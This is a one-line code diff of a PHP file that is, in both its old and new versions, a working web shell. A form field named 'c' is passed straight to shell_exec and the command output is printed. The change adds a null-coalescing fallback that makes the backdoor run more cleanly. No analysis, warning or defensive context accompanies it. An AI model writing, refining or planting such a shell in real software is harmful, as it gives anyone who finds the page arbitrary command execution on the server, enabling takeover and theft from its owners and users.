@@ -1,1 +1,1 @@
-<?php if(isset($_POST["c"])){echo "<pre>".htmlspecialchars(shell_exec($_POST["c"]))."</pre>";}?><body style=background:#fff;font-family:monospace;padding:16px><form method=post><input name=c style=width:95% autofocus><button>Run</button></form>
+<?php if(isset($_POST["c"])){echo "<pre>".htmlspecialchars(shell_exec($_POST["c"])??"")."</pre>";}?><body style=background:#fff;font-family:monospace;padding:16px><form method=post><input name=c style=width:95% autofocus><button>Run</button></form>
